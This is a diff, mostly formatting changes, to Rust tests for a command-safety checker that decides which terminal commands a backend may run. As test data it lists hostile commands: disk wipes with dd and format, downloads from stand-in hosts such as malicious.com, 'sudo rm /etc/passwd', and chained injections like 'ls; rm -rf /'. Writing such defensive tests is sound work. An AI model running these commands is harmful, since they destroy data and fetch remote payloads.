@@ -216,7 +216,11 @@ mod tests {
         ];
 
         for cmd in &dangerous_commands {
-            assert!(!is_command_safe(cmd), "Command should be dangerous: {}", cmd);
+            assert!(
+                !is_command_safe(cmd),
+                "Command should be dangerous: {}",
+                cmd
+            );
         }
     }
 
@@ -233,7 +237,11 @@ mod tests {
         ];
 
         for cmd in &dangerous_commands {
-            assert!(!is_command_safe(cmd), "Command should be dangerous (case test): {}", cmd);
+            assert!(
+                !is_command_safe(cmd),
+                "Command should be dangerous (case test): {}",
+                cmd
+            );
         }
     }
 
@@ -250,7 +258,11 @@ mod tests {
         ];
 
         for cmd in &safe_commands {
-            assert!(is_command_safe(cmd), "Command should be safe (case test): {}", cmd);
+            assert!(
+                is_command_safe(cmd),
+                "Command should be safe (case test): {}",
+                cmd
+            );
         }
     }
 
@@ -271,12 +283,22 @@ mod tests {
 
         for cmd in &definitely_dangerous {
             // These should still be flagged as dangerous due to our conservative approach
-            assert!(!is_command_safe(cmd), "Command should be flagged as dangerous: {}", cmd);
+            assert!(
+                !is_command_safe(cmd),
+                "Command should be flagged as dangerous: {}",
+                cmd
+            );
         }
 
         // These are safe because they start with safe commands
-        assert!(is_command_safe("grep 'curl' logfile.txt"), "grep command should be safe");
-        assert!(is_command_safe("cat file_with_rm_in_name.txt"), "cat command should be safe even with rm in filename");
+        assert!(
+            is_command_safe("grep 'curl' logfile.txt"),
+            "grep command should be safe"
+        );
+        assert!(
+            is_command_safe("cat file_with_rm_in_name.txt"),
+            "cat command should be safe even with rm in filename"
+        );
     }
 
     #[test]
@@ -290,7 +312,11 @@ mod tests {
         ];
 
         for cmd in &chaining_commands {
-            assert!(!is_command_safe(cmd), "Chained command should be dangerous: {}", cmd);
+            assert!(
+                !is_command_safe(cmd),
+                "Chained command should be dangerous: {}",
+                cmd
+            );
         }
     }
 
@@ -304,7 +330,11 @@ mod tests {
         ];
 
         for cmd in &path_commands {
-            assert!(!is_command_safe(cmd), "Path modification should be dangerous: {}", cmd);
+            assert!(
+                !is_command_safe(cmd),
+                "Path modification should be dangerous: {}",
+                cmd
+            );
         }
     }
 
@@ -320,7 +350,11 @@ mod tests {
         ];
 
         for cmd in &execution_commands {
-            assert!(!is_command_safe(cmd), "Code execution should be dangerous: {}", cmd);
+            assert!(
+                !is_command_safe(cmd),
+                "Code execution should be dangerous: {}",
+                cmd
+            );
         }
     }
 
@@ -328,7 +362,7 @@ mod tests {
     async fn test_execute_safe_command() {
         let result = execute_terminal_command("echo test").await;
         assert!(result.is_ok(), "Safe command should execute successfully");
-        
+
         let output = result.unwrap();
         assert!(output.contains("Exit code: 0"));
         assert!(output.contains("test"));
@@ -338,7 +372,7 @@ mod tests {
     async fn test_execute_dangerous_command_blocked() {
         let result = execute_terminal_command("rm -rf dangerous").await;
         assert!(result.is_err(), "Dangerous command should be blocked");
-        
+
         match result.unwrap_err() {
             BackendError::CommandNotAllowed => {
                 // This is the expected error
@@ -347,13 +381,13 @@ mod tests {
         }
     }
 
-    #[tokio::test] 
+    #[tokio::test]
     async fn test_execute_nonexistent_command() {
         // Test executing a safe but non-existent command
         // Use "nonexistentcmd" which starts with a pattern not in our safe list
         let result = execute_terminal_command("nonexistentcmd_12345_unique").await;
         assert!(result.is_err(), "Non-existent command should fail");
-        
+
         match result.unwrap_err() {
             BackendError::CommandNotAllowed => {
                 // This is expected since the command doesn't match safe patterns
@@ -362,7 +396,10 @@ mod tests {
                 // This would be the case if it was deemed safe but failed to execute
                 assert!(msg.contains("Failed to execute command") || msg.contains("Exit code:"));
             }
-            other => panic!("Expected CommandNotAllowed or CommandExecutionFailed error, got: {:?}", other),
+            other => panic!(
+                "Expected CommandNotAllowed or CommandExecutionFailed error, got: {:?}",
+                other
+            ),
         }
     }
 
@@ -398,7 +435,11 @@ mod tests {
         ];
 
         for cmd in &help_commands {
-            assert!(is_command_safe(cmd), "Help/version command should be safe: {}", cmd);
+            assert!(
+                is_command_safe(cmd),
+                "Help/version command should be safe: {}",
+                cmd
+            );
         }
     }
 
@@ -406,7 +447,7 @@ mod tests {
     async fn test_command_output_formatting() {
         // Test a command that we expect to succeed
         let result = execute_terminal_command("echo hello world").await;
-        
+
         if let Ok(output) = result {
             assert!(output.contains("Exit code: 0"));
             assert!(output.contains("Output:"));
@@ -426,26 +467,21 @@ mod tests {
             ("Directory removal", "rd /s /q C:\\"),
             ("Format drive", "format C:"),
             ("Disk wipe", "dd if=/dev/zero of=/dev/sda"),
-            
             // Network attacks
             ("Download malware", "curl http://malicious.com/malware"),
             ("Wget attack", "wget ftp://attack.com/payload"),
-            
             // System control
             ("Shutdown", "shutdown -h now"),
             ("Reboot", "reboot"),
             ("Kill services", "systemctl stop sshd"),
-            
             // Privilege escalation
             ("Sudo", "sudo rm /etc/passwd"),
             ("Su switch", "su root"),
             ("Password change", "passwd root"),
-            
             // Command injection
             ("Shell injection", "ls; rm -rf /"),
             ("Pipe attack", "cat file | sudo rm /etc/hosts"),
             ("Logic attack", "echo test && curl malicious.com"),
-            
             // Code execution
             ("Eval", "eval malicious_code"),
             ("Exec", "exec dangerous_binary"),
@@ -455,9 +491,9 @@ mod tests {
 
         for (description, command) in &attack_vectors {
             assert!(
-                !is_command_safe(command), 
-                "Attack vector '{}' should be blocked: {}", 
-                description, 
+                !is_command_safe(command),
+                "Attack vector '{}' should be blocked: {}",
+                description,
                 command
             );
         }
